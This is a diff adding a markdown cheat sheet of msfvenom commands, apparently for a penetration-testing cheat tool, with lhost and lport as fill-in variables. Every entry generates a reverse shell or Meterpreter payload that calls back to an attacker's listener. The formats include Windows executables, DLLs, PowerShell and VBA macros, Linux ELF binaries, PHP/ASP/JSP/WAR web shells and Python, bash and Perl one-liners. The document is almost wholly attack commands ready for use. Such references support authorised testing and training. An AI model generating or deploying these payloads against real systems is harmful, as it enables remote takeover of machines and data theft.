@@ -1,0 +1,236 @@
+# Msfvenom
+
+## info
+
+### List payload options
+
+List payload options.
+
+```sh title:"List msfvenom payload options"
+msfvenom --list-options payload
+```
+<!-- cheat -->
+
+## windows
+
+### Windows x86 Meterpreter TCP
+
+Generate a Windows x86 Meterpreter reverse TCP executable.
+
+```sh title:"Windows x86 Meterpreter reverse TCP exe"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Windows x64 Meterpreter TCP
+
+Generate a Windows x64 Meterpreter reverse TCP executable.
+
+```sh title:"Windows x64 Meterpreter reverse TCP exe"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell_x64.exe
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Windows x86 shell TCP
+
+Generate a Windows x86 command shell reverse TCP executable.
+
+```sh title:"Windows x86 command shell reverse TCP exe"
+msfvenom -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Windows x64 shell TCP
+
+Generate a Windows x64 command shell reverse TCP executable.
+
+```sh title:"Windows x64 command shell reverse TCP exe"
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell_x64.exe
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Windows x64 Meterpreter HTTPS
+
+Generate a Windows x64 Meterpreter reverse HTTPS executable.
+
+```sh title:"Windows x64 Meterpreter reverse HTTPS exe"
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f exe -o msfstaged.exe
+```
+<!-- cheat
+var lhost
+var lport := 443
+-->
+
+### Windows x64 Meterpreter HTTPS unstaged
+
+Generate a Windows x64 unstaged Meterpreter reverse HTTPS executable.
+
+```sh title:"Windows x64 unstaged Meterpreter reverse HTTPS exe"
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe -o msfnonstaged.exe
+```
+<!-- cheat
+var lhost
+var lport := 443
+-->
+
+### Windows DLL x64 HTTPS
+
+Generate a Windows x64 Meterpreter reverse HTTPS DLL.
+
+```sh title:"Windows x64 Meterpreter reverse HTTPS DLL"
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport -f dll -o output.dll
+```
+<!-- cheat
+var lhost
+var lport := 443
+-->
+
+### PowerShell x64 HTTPS
+
+Generate a PowerShell Meterpreter reverse HTTPS payload.
+
+```sh title:"PowerShell x64 Meterpreter reverse HTTPS"
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport EXITFUNC=thread -f psh -o shell_x64.ps1
+```
+<!-- cheat
+var lhost
+var lport := 443
+-->
+
+### VBA x64 HTTPS
+
+Generate a VBA Meterpreter reverse HTTPS payload.
+
+```sh title:"VBA x64 Meterpreter reverse HTTPS"
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lhost LPORT=$lport EXITFUNC=thread -f vba -o shell_x64.vba
+```
+<!-- cheat
+var lhost
+var lport := 443
+-->
+
+## linux
+
+### Linux x86 Meterpreter
+
+Generate a Linux x86 Meterpreter reverse TCP ELF.
+
+```sh title:"Linux x86 Meterpreter reverse TCP ELF"
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o shell.elf
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Linux x64 Meterpreter
+
+Generate a Linux x64 Meterpreter reverse TCP ELF.
+
+```sh title:"Linux x64 Meterpreter reverse TCP ELF"
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport PrependFork=true -f elf -o shell_x64.elf
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+## web
+
+### PHP Meterpreter
+
+Generate a PHP Meterpreter reverse TCP payload.
+
+```sh title:"PHP Meterpreter reverse TCP"
+msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o shell.php
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### ASP Meterpreter
+
+Generate an ASP Meterpreter reverse TCP payload.
+
+```sh title:"ASP Meterpreter reverse TCP"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp -o shell.asp
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### JSP shell
+
+Generate a JSP reverse shell.
+
+```sh title:"JSP reverse shell"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o shell.jsp
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### WAR shell
+
+Generate a WAR reverse shell.
+
+```sh title:"WAR reverse shell"
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war -o shell.war
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+## unix scripting
+
+### Python shell
+
+Generate a Python reverse shell.
+
+```sh title:"Python reverse shell"
+msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw -o shell.py
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Bash shell
+
+Generate a bash reverse shell.
+
+```sh title:"Bash reverse shell"
+msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw -o shell.sh
+```
+<!-- cheat
+var lhost
+var lport
+-->
+
+### Perl shell
+
+Generate a Perl reverse shell.
+
+```sh title:"Perl reverse shell"
+msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw -o shell.pl
+```
+<!-- cheat
+var lhost
+var lport
+-->
